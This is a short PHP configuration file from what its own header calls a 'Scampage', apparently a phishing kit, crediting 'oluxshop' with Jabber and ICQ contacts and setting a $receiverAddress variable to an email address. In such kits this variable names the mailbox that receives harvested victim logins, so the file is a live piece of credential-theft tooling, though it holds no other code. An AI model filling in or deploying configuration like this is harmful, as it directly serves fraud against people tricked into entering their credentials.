<?php
/*
 * Scampage by oluxshop
 * Jabber: christopherbourne101@gmail.com
 * ICQ: 724691041
 */

$receiverAddress = "christopherbourne101@gmail.com";


?>